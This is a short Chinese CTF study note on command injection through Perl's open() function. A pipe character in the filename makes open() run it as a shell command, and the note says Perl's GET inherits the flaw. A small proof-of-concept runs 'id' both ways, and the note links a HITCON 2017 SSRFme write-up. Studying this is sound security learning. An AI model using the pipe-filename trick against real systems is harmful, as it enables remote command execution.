在perl语言中，`open`函数存在命令执行漏洞：如果`open`文件名中存在管道符（也叫或符号|），就会将文件名直接以命令的形式执行，然后将命令的结果存到与命令同名的文件中。而`GET`命令底层调用了open函数，故存在此漏洞。
```powershell
$ cat a.pl
open(FD, "id|");    # 管道符在尾部 
print <FD>;

open(FD, "|id");    # 管道符在头部
print <FD>;

p$ perl a.pl
uid=1000(ricter) gid=1000(ricter) groups=1000(ricter)
uid=1000(ricter) gid=1000(ricter) groups=1000(ricter)   #两个方法都可以执行
```
### 例题
[HITCON 2017]SSRFme<br />WP [[HITCON 2017]SSRFme 1 Perl GET任意命令执行漏洞 - AikNr - 博客园](https://www.cnblogs.com/AikN/p/15953194.html)
